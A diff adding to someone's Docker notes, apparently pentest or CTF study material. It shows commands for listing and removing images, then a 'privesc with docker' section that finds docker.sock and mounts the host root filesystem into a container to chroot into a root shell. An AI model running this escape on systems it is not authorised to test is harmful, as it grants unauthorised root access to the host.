@@ -87,3 +87,52 @@ docker stop d8162fd1ab99
 ```bash
 docker rm d8162fd1ab99
 ```
+
+
+##### remove docker images
+
+```bash
+sudo docker images
+```
+
+```bash
+REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
+rce           latest    9815dffedc8a   3 hours ago   1.1GB
+<none>        <none>    ab342d382e9c   3 hours ago   919MB
+my-node-app   latest    4af22866525b   3 hours ago   919MB
+<none>        <none>    3042fe5c6efc   3 hours ago   919MB
+```
+
+```bash
+sudo docker rmi ab342d382e9c
+Deleted: sha256:ab342d382e9cb9f371cf96badbcc91e1d3e44448d2ce0751f838fa2ea6db44ab
+```
+or 
+```bash
+sudo docker rmi -f rce
+Untagged: rce:latest
+Deleted: sha256:9815dffedc8a58d7dda263c219ab8b0e13890453a15c22c2ec189a19188273a9
+```
+
+
+##### privesc with docker
+
+ref:- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape
+
+
+```bash
+find / -name docker.sock 2>/dev/null
+
+/run/docker.sock
+```
+
+```bash
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+alpine              latest              a24bb4013296        3 years ago         5.57MB
+hello-world         latest              bf756fb1ae65        3 years ago         13.3kB
+```
+
+```bash
+docker run -it -v /:/host/ alpine chroot /host/ bash
+```
